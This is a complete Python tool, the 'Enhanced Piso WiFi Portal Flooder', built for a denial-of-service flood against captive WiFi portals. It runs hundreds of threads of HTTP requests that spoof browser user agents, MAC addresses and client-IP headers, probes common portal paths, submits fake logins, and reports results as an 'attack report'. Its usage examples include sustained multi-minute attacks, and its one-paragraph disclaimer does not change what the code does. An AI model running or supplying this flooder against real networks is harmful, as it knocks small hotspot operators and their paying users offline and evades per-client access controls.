#!/usr/bin/env python3
"""
Piso WiFi Portal Flooder - Enhanced with Duration Support
Realistic user simulation with custom duration time
"""

import requests
import threading
import time
import random
import uuid
import json
import socket
from datetime import datetime, timedelta
import argparse
from queue import Queue
import sys
import urllib3
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class EnhancedPortalFlooder:
    def __init__(self, portal_url: str, num_users: int = 1000, duration: int = None):
        """
        Initialize enhanced portal flooder
        
        Args:
            portal_url: Full portal URL (e.g., http://10.0.0.1/client?page=dashboard)
            num_users: Number of concurrent users to simulate
            duration: Duration in seconds (None for fixed users mode)
        """
        self.portal_url = portal_url
        self.parsed_url = urlparse(portal_url)
        self.num_users = num_users
        self.duration = duration
        
        # Statistics
        self.success_count = 0
        self.failed_count = 0
        self.total_requests = 0
        self.lock = threading.Lock()
        
        # Performance tracking
        self.start_time = None
        self.end_time = None
        
        # Results
        self.results = []
        
        # Session management
        self.sessions = {}
        self.session_lock = threading.Lock()
        
        print(f"🎯 Target Portal: {portal_url}")
        if duration:
            print(f"⏱️  Duration: {duration} seconds")
        else:
            print(f"👥 Number of Users: {num_users:,}")
    
    def generate_realistic_user_agent(self, user_id: int):
        """Generate realistic user agent based on device type"""
        devices = {
            'windows_chrome': [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
            ],
            'windows_firefox': [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0"
            ],
            'android_chrome': [
                "Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36",
                "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36",
                "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36"
            ],
            'iphone_safari': [
                "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
            ],
            'mac_safari': [
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
            ]
        }
        
        # Weight devices based on real-world distribution
        device_weights = {
            'android_chrome': 40,  # 40% Android
            'iphone_safari': 30,   # 30% iPhone
            'windows_chrome': 15,  # 15% Windows Chrome
            'windows_firefox': 10, # 10% Windows Firefox
            'mac_safari': 5        # 5% Mac Safari
        }
        
        device_type = random.choices(
            list(device_weights.keys()),
            weights=list(device_weights.values())
        )[0]
        
        return random.choice(devices[device_type])
    
    def generate_realistic_ip(self, user_id: int):
        """Generate realistic IP address ranges"""
        # Common internal IP ranges
        ip_ranges = [
            ("192.168", lambda: f"192.168.{random.randint(1, 254)}.{random.randint(2, 254)}"),
            ("10.0", lambda: f"10.0.{random.randint(0, 255)}.{random.randint(1, 254)}"),
            ("172.16", lambda: f"172.16.{random.randint(0, 31)}.{random.randint(1, 254)}")
        ]
        
        # Weight common ranges
        range_weights = [70, 20, 10]  # 70% 192.168.x.x, 20% 10.x.x.x, 10% 172.16-31.x.x
        ip_range = random.choices(ip_ranges, weights=range_weights)[0]
        return ip_range[1]()
    
    def generate_realistic_mac(self, user_id: int):
        """Generate realistic MAC address based on manufacturer"""
        # Common manufacturer OUI prefixes
        oui_prefixes = [
            "00:0C:29",  # VMware
            "00:50:56",  # VMware
            "00:1C:42",  # Apple
            "00:26:BB",  # Apple
            "00:25:BC",  # Apple
            "A4:5E:60",  # Apple
            "9C:30:5B",  # Samsung
            "64:5A:04",  # LG
            "FC:F1:52",  # Samsung
            "8C:85:90",  # Apple
            "00:1A:11",  # Google
            "D8:96:95",  # Apple
            "F0:18:98",  # Apple
            "88:66:A5",  # Apple
            "AC:BC:32",  # Apple
            "B8:E8:56",  # Apple
            "CC:20:E8",  # Apple
            "F0:24:75",  # Apple
            "00:23:DF",  # Dell
            "00:1E:4F",  # Lenovo
            "00:26:2D",  # Cisco
            "00:19:B9",  # D-Link
        ]
        
        oui = random.choice(oui_prefixes)
        return f"{oui}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}"
    
    def generate_session_cookie(self, user_id: int):
        """Generate realistic session cookie"""
        session_ids = [
            f"session_{uuid.uuid4().hex[:16]}",
            f"PHPSESSID_{uuid.uuid4().hex[:12]}",
            f"sid_{uuid.uuid4().hex[:20]}",
            f"connect.sid={uuid.uuid4()}",
            f"JSESSIONID={uuid.uuid4().hex}"
        ]
        return random.choice(session_ids)
    
    def generate_portal_parameters(self, user_id: int):
        """Generate realistic portal parameters"""
        common_params = {
            'mac': [self.generate_realistic_mac(user_id)],
            'ip': [self.generate_realistic_ip(user_id)],
            'redirect': ['http://www.google.com/generate_204', 'http://captive.apple.com/hotspot-detect.html', 'http://www.msftconnecttest.com/connecttest.txt'],
            'ssid': ['PisoWifi', 'FreeWifi', 'PublicWifi', 'GuestWifi', 'Hotspot'],
            'ap': ['00:11:22:33:44:55', 'AA:BB:CC:DD:EE:FF'],
            't': [str(int(time.time())), str(int(time.time()) - random.randint(0, 3600))],
            'id': [str(uuid.uuid4().hex[:8]), str(random.randint(100000, 999999))],
            'vlan': [str(random.randint(1, 100))],
            'url': ['http://www.google.com', 'http://www.facebook.com', 'http://www.youtube.com'],
            'client_mac': [self.generate_realistic_mac(user_id)],
            'client_ip': [self.generate_realistic_ip(user_id)]
        }
        
        # Randomly select 3-5 parameters
        num_params = random.randint(3, 5)
        selected_params = random.sample(list(common_params.keys()), num_params)
        
        params = {}
        for param in selected_params:
            params[param] = random.choice(common_params[param])
        
        return params
    
    def create_session(self, user_id: int):
        """Create realistic user session"""
        with self.session_lock:
            session_id = f"user_{user_id}"
            if session_id not in self.sessions:
                self.sessions[session_id] = {
                    'user_agent': self.generate_realistic_user_agent(user_id),
                    'ip_address': self.generate_realistic_ip(user_id),
                    'mac_address': self.generate_realistic_mac(user_id),
                    'session_cookie': self.generate_session_cookie(user_id),
                    'last_request': time.time(),
                    'request_count': 0,
                    'referer': None
                }
            return self.sessions[session_id]
    
    def get_headers(self, session_data, referer=None):
        """Generate complete HTTP headers"""
        headers = {
            'User-Agent': session_data['user_agent'],
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'X-Forwarded-For': session_data['ip_address'],
            'X-Client-IP': session_data['ip_address'],
            'X-Real-IP': session_data['ip_address'],
            'X-Client-MAC': session_data['mac_address'],
            'X-Requested-With': 'XMLHttpRequest' if random.random() < 0.3 else '',
        }
        
        # Add cookie if exists
        if session_data['session_cookie']:
            headers['Cookie'] = session_data['session_cookie']
        
        # Add referer if available
        if referer:
            headers['Referer'] = referer
        
        # Randomly add DNT header
        if random.random() < 0.7:
            headers['DNT'] = '1'
        
        # Add common browser headers
        headers['Sec-Fetch-Dest'] = 'document'
        headers['Sec-Fetch-Mode'] = 'navigate'
        headers['Sec-Fetch-Site'] = 'cross-site' if random.random() < 0.5 else 'same-site'
        headers['Sec-Fetch-User'] = '?1'
        
        return headers
    
    def probe_portal_variants(self):
        """Probe for different portal URLs and parameters"""
        base_url = f"{self.parsed_url.scheme}://{self.parsed_url.netloc}"
        
        common_variants = [
            f"{base_url}/login",
            f"{base_url}/hotspot",
            f"{base_url}/captive",
            f"{base_url}/connect",
            f"{base_url}/wifi",
            f"{base_url}/guest",
            f"{base_url}/portal",
            f"{base_url}/auth",
            f"{base_url}/walledgarden",
            f"{base_url}/",
            f"{base_url}/index.html",
            f"{base_url}/index.php",
            f"{base_url}/client.php",
            f"{base_url}/login.php",
            f"{base_url}/hotspot-detect.html",
        ]
        
        print(f"\n🔍 Probing portal variants...")
        working_urls = []
        
        for variant in common_variants:
            try:
                response = requests.get(
                    variant,
                    timeout=2,
                    verify=False,
                    headers={'User-Agent': self.generate_realistic_user_agent(0)}
                )
                
                if response.status_code == 200:
                    working_urls.append(variant)
                    print(f"  ✓ Found: {variant}")
                
            except:
                continue
        
        return working_urls
    
    def make_request(self, user_id: int, url_variant=None):
        """Make a single portal request with realistic behavior"""
        session_data = self.create_session(user_id)
        
        # Determine which URL to use
        if url_variant:
            target_url = url_variant
        else:
            # Use original URL with varied parameters
            parsed = urlparse(self.portal_url)
            params = self.generate_portal_parameters(user_id)
            
            # Mix with existing parameters
            existing_params = parse_qs(parsed.query)
            params.update({k: v[0] for k, v in existing_params.items()})
            
            # Reconstruct URL
            target_url = urlunparse((
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                urlencode(params),
                parsed.fragment
            ))
        
        headers = self.get_headers(session_data, referer=session_data.get('referer'))
        
        try:
            # Vary request method (mostly GET, some POST)
            if random.random() < 0.2:  # 20% POST requests
                post_data = {
                    'username': f'user_{random.randint(1000, 9999)}',
                    'password': 'password',
                    'agree': 'on',
                    'terms': 'accept',
                    'submit': 'Login'
                }
                response = requests.post(
                    target_url,
                    data=post_data,
                    headers=headers,
                    timeout=5,
                    verify=False,
                    allow_redirects=True
                )
            else:
                response = requests.get(
                    target_url,
                    headers=headers,
                    timeout=5,
                    verify=False,
                    allow_redirects=True
                )
            
            # Update session data
            session_data['last_request'] = time.time()
            session_data['request_count'] += 1
            
            # Update referer for next request
            if random.random() < 0.5:
                session_data['referer'] = target_url
            
            # Analyze response
            status = "UNKNOWN"
            if response.status_code == 200:
                content = response.text.lower()
                
                # Check for common portal indicators
                portal_indicators = ['login', 'welcome', 'password', 'username', 'portal', 'hotspot', 'wifi', 'connect']
                is_portal_page = any(indicator in content for indicator in portal_indicators)
                
                if is_portal_page:
                    status = "PORTAL_SUCCESS"
                elif response.history:  # Redirected
                    status = f"REDIRECT_{response.status_code}"
                else:
                    status = "SUCCESS_200"
                    
            elif response.status_code == 302 or response.status_code == 301:
                status = f"REDIRECT_{response.status_code}"
            elif response.status_code == 404:
                status = "NOT_FOUND"
            elif response.status_code == 403:
                status = "FORBIDDEN"
            elif response.status_code == 500:
                status = "SERVER_ERROR"
            else:
                status = f"HTTP_{response.status_code}"
            
            # Update statistics
            with self.lock:
                self.total_requests += 1
                self.success_count += 1
                
                self.results.append({
                    'user_id': user_id,
                    'status': status,
                    'status_code': response.status_code,
                    'response_time': response.elapsed.total_seconds() * 1000,
                    'url': target_url,
                    'method': 'POST' if 'post_data' in locals() else 'GET'
                })
            
            return True, status
            
        except requests.exceptions.Timeout:
            with self.lock:
                self.total_requests += 1
                self.failed_count += 1
                self.results.append({
                    'user_id': user_id,
                    'status': 'TIMEOUT',
                    'status_code': 0,
                    'response_time': 0,
                    'url': target_url,
                    'method': 'N/A'
                })
            return False, 'TIMEOUT'
            
        except requests.exceptions.ConnectionError as e:
            with self.lock:
                self.total_requests += 1
                self.failed_count += 1
                error_msg = str(e).lower()
                
                if 'refused' in error_msg:
                    status = 'CONNECTION_REFUSED'
                elif 'reset' in error_msg:
                    status = 'CONNECTION_RESET'
                else:
                    status = 'CONNECTION_ERROR'
                
                self.results.append({
                    'user_id': user_id,
                    'status': status,
                    'status_code': 0,
                    'response_time': 0,
                    'url': target_url,
                    'method': 'N/A'
                })
            return False, status
            
        except Exception as e:
            with self.lock:
                self.total_requests += 1
                self.failed_count += 1
                self.results.append({
                    'user_id': user_id,
                    'status': f'ERROR: {str(e)[:30]}',
                    'status_code': 0,
                    'response_time': 0,
                    'url': target_url,
                    'method': 'N/A'
                })
            return False, 'EXCEPTION'
    
    def flood_portal(self, concurrent_threads: int = 100, use_variants: bool = True):
        """
        Enhanced flood with realistic user behavior
        
        Args:
            concurrent_threads: Number of concurrent threads
            use_variants: Whether to probe and use URL variants
        """
        print("\n" + "="*80)
        print("               ENHANCED PORTAL FLOOD ATTACK")
        print("="*80)
        print(f"🎯 Target: {self.portal_url}")
        print(f"🧵 Concurrent Threads: {concurrent_threads}")
        print(f"🕐 Start Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"🔍 Using URL Variants: {use_variants}")
        
        if self.duration:
            print(f"⏱️  Mode: Duration-based ({self.duration} seconds)")
        else:
            print(f"👥 Mode: Fixed users ({self.num_users:,} users)")
        print("-"*80)
        
        # Probe for working URLs
        url_variants = []
        if use_variants:
            url_variants = self.probe_portal_variants()
            if url_variants:
                print(f"\n✅ Found {len(url_variants)} working portal URLs")
        
        self.start_time = time.time()
        
        if self.duration:
            # Duration-based mode
            end_time = self.start_time + self.duration
            
            def duration_worker(worker_id: int):
                while time.time() < end_time:
                    user_id = random.randint(0, 1000000)
                    url_variant = random.choice(url_variants) if url_variants else None
                    
                    # Simulate realistic browsing pattern
                    if random.random() < 0.3:  # 30% of users make 2-3 requests
                        num_requests = random.randint(2, 3)
                        for _ in range(num_requests):
                            self.make_request(user_id, url_variant)
                            time.sleep(random.uniform(0.1, 0.5))
                    else:
                        self.make_request(user_id, url_variant)
                    
                    # Random delay between user simulations
                    time.sleep(random.uniform(0.01, 0.05))
            
            # Start worker threads
            threads = []
            print(f"\n🚀 Starting {concurrent_threads} concurrent threads for {self.duration} seconds...")
            
            for i in range(concurrent_threads):
                thread = threading.Thread(target=duration_worker, args=(i,))
                thread.daemon = True
                thread.start()
                threads.append(thread)
                time.sleep(0.01)
            
            # Monitor progress
            print(f"\n📡 Continuous flood in progress...")
            print("   (Simulating various devices, browsers, and browsing patterns)")
            
            last_update = time.time()
            while time.time() < end_time:
                elapsed = time.time() - self.start_time
                remaining = end_time - time.time()
                
                with self.lock:
                    req_per_sec = self.total_requests / elapsed if elapsed > 0 else 0
                    success_rate = (self.success_count / self.total_requests) * 100 if self.total_requests > 0 else 0
                    
                    if time.time() - last_update > 2:
                        print(f"\r⏱️  Time: {elapsed:.1f}s / {self.duration}s | "
                              f"📊 Requests: {self.total_requests:,} | "
                              f"✅ Success: {self.success_count:,} ({success_rate:.1f}%) | "
                              f"⚡ Rate: {req_per_sec:.1f} req/sec | "
                              f"⏳ Remaining: {remaining:.1f}s", end="", flush=True)
                        last_update = time.time()
                
                time.sleep(1)
            
            print()  # New line after progress
            self.end_time = time.time()
            
        else:
            # Fixed users mode
            # Create work queue with user IDs and URL variants
            work_queue = Queue()
            for user_id in range(self.num_users):
                url_variant = random.choice(url_variants) if url_variants else None
                work_queue.put((user_id, url_variant))
            
            # Worker function
            def worker(worker_id: int):
                while not work_queue.empty():
                    try:
                        user_id, url_variant = work_queue.get_nowait()
                        
                        # Simulate realistic browsing pattern
                        if random.random() < 0.3:  # 30% of users make 2-3 requests
                            num_requests = random.randint(2, 3)
                            for _ in range(num_requests):
                                success, status = self.make_request(user_id, url_variant)
                                time.sleep(random.uniform(0.1, 0.5))
                        else:
                            success, status = self.make_request(user_id, url_variant)
                        
                        work_queue.task_done()
                        
                    except:
                        break
            
            # Create and start worker threads
            threads = []
            print(f"\n🚀 Starting {concurrent_threads} concurrent threads...")
            
            for i in range(concurrent_threads):
                thread = threading.Thread(target=worker, args=(i,))
                thread.daemon = True
                thread.start()
                threads.append(thread)
                
                # Stagger thread creation
                if i % 20 == 0:
                    time.sleep(0.05)
            
            print(f"\n📡 Flooding portal with {self.num_users:,} realistic user sessions...")
            print("   (Simulating various devices, browsers, and browsing patterns)")
            
            # Monitor progress
            last_update = time.time()
            while any(thread.is_alive() for thread in threads):
                with self.lock:
                    elapsed = time.time() - self.start_time
                    if self.total_requests > 0:
                        req_per_sec = self.total_requests / elapsed
                        success_rate = (self.success_count / self.total_requests) * 100
                        
                        if time.time() - last_update > 2:
                            print(f"\r📊 Progress: {self.total_requests:,}/{self.num_users:,} req | "
                                  f"Success: {self.success_count:,} ({success_rate:.1f}%) | "
                                  f"Rate: {req_per_sec:.1f} req/sec | "
                                  f"Active: {threading.active_count()-1} threads", end="", flush=True)
                            last_update = time.time()
                
                time.sleep(0.5)
                
                # Check if work queue is empty
                if work_queue.empty():
                    # Give threads time to finish
                    for thread in threads:
                        thread.join(timeout=1)
            
            print()  # New line after progress
            self.end_time = time.time()
        
        # Print final report
        self.print_enhanced_report()
    
    def print_enhanced_report(self):
        """Print detailed enhanced report"""
        duration = self.end_time - self.start_time
        
        print("\n" + "="*80)
        print("                   ENHANCED ATTACK REPORT")
        print("="*80)
        
        print(f"\n📊 REQUEST STATISTICS:")
        print(f"   Total Requests: {self.total_requests:,}")
        print(f"   Successful: {self.success_count:,}")
        print(f"   Failed: {self.failed_count:,}")
        
        if self.total_requests > 0:
            success_rate = (self.success_count / self.total_requests) * 100
            print(f"   Success Rate: {success_rate:.2f}%")
        
        print(f"\n⏱️  PERFORMANCE METRICS:")
        print(f"   Total Duration: {duration:.2f} seconds")
        if duration > 0:
            print(f"   Requests per Second: {self.total_requests / duration:.2f}")
        
        # Response breakdown
        print(f"\n🔢 RESPONSE BREAKDOWN:")
        status_counts = {}
        for result in self.results:
            status = result['status']
            status_counts[status] = status_counts.get(status, 0) + 1
        
        # Sort by count
        for status, count in sorted(status_counts.items(), key=lambda x: x[1], reverse=True):
            percentage = (count / self.total_requests) * 100 if self.total_requests > 0 else 0
            if 'PORTAL' in status or 'SUCCESS' in status:
                print(f"   ✅ {status}: {count:,} ({percentage:.1f}%)")
            elif 'ERROR' in status or 'FAILED' in status:
                print(f"   ❌ {status}: {count:,} ({percentage:.1f}%)")
            else:
                print(f"   ℹ️  {status}: {count:,} ({percentage:.1f}%)")
        
        # Save detailed results
        self.save_enhanced_results(duration)
        
        print("\n" + "="*80)
        print("✅ Attack completed!")
    
    def save_enhanced_results(self, duration: float):
        """Save enhanced results to file"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"enhanced_portal_flood_{timestamp}.txt"
        
        with open(filename, 'w') as f:
            f.write("="*80 + "\n")
            f.write("ENHANCED PORTAL FLOOD ATTACK REPORT\n")
            f.write("="*80 + "\n\n")
            
            f.write(f"Target URL: {self.portal_url}\n")
            f.write(f"Test Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Duration: {duration:.2f} seconds\n")
            
            if self.duration:
                f.write(f"Test Mode: Duration-based ({self.duration} seconds)\n")
            else:
                f.write(f"Test Mode: Fixed users ({self.num_users} users)\n")
            
            f.write(f"Total Sessions: {len(self.sessions)}\n\n")
            
            f.write("📊 STATISTICS:\n")
            f.write("-"*40 + "\n")
            f.write(f"Total Requests: {self.total_requests}\n")
            f.write(f"Successful: {self.success_count}\n")
            f.write(f"Failed: {self.failed_count}\n")
            
            if self.total_requests > 0:
                success_rate = (self.success_count / self.total_requests) * 100
                f.write(f"Success Rate: {success_rate:.2f}%\n")
            
            f.write(f"Requests per Second: {self.total_requests / duration:.2f}\n\n")
        
        print(f"\n📁 Results saved to: {filename}")


def main():
    """Main function"""
    parser = argparse.ArgumentParser(
        description="Enhanced Piso WiFi Portal Flooder - Realistic user simulation with duration support",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Duration-based flood for 5 minutes (300 seconds)
  python3 portal_flood.py --url "http://10.0.0.1/client?page=dashboard" --duration 300
  
  # Fixed users mode with 1000 users
  python3 portal_flood.py --url "http://10.0.0.1/client?page=dashboard" --users 1000
  
  # Duration flood with high threads for 2 minutes
  python3 portal_flood.py --url "http://10.0.0.1/client?page=dashboard" --duration 120 --threads 500
  
  # Quick test for 30 seconds
  python3 portal_flood.py --url "http://10.0.0.1/client?page=dashboard" --duration 30 --threads 50
  
  # 10-minute sustained attack
  python3 portal_flood.py --url "http://10.0.0.1/client?page=dashboard" --duration 600 --threads 200
        """
    )
    
    parser.add_argument("--url", "-u", required=True, help="Portal URL (e.g., http://10.0.0.1/client?page=dashboard)")
    parser.add_argument("--users", "-n", type=int, default=1000, help="Number of users/requests (default: 1000)")
    parser.add_argument("--threads", "-t", type=int, default=100, help="Concurrent threads (default: 100)")
    parser.add_argument("--duration", "-d", type=int, help="Duration in seconds (overrides --users)")
    parser.add_argument("--no-variants", action="store_true", help="Disable URL variant probing")
    
    args = parser.parse_args()
    
    print("="*80)
    print("            ENHANCED PISO WIFI PORTAL FLOODER")
    print("          Duration Support + Realistic User Simulation")
    print("="*80)
    
    print(f"\n⚠️  LEGAL DISCLAIMER:")
    print("This tool is for educational purposes only.")
    print("Only use on networks you own or have explicit permission to test.")
    print("Unauthorized use may violate laws and terms of service.")
    print("The developers assume no responsibility for misuse.\n")
    
    print(f"🎯 Target URL: {args.url}")
    
    if args.duration:
        print(f"⏱️  Mode: Duration-based flood")
        print(f"Duration: {args.duration} seconds")
    else:
        print(f"👥 Mode: Fixed number of users")
        print(f"Total Users: {args.users:,}")
    
    print(f"🧵 Concurrent Threads: {args.threads}")
    print(f"🔍 URL Variant Probing: {not args.no_variants}")
    
    # Final confirmation
    confirm = input("\n🚦 Are you sure you want to proceed? (yes/no): ").lower()
    if confirm != 'yes':
        print("\n❌ Operation cancelled")
        return
    
    # Create enhanced flooder
    flooder = EnhancedPortalFlooder(
        portal_url=args.url,
        num_users=args.users,
        duration=args.duration
    )
    
    try:
        flooder.flood_portal(
            concurrent_threads=args.threads,
            use_variants=not args.no_variants
        )
            
    except KeyboardInterrupt:
        print("\n\n⚠️  Flood interrupted by user")
        if flooder.start_time:
            flooder.end_time = time.time()
            flooder.print_enhanced_report()
            
    except Exception as e:
        print(f"\n❌ Error: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    main()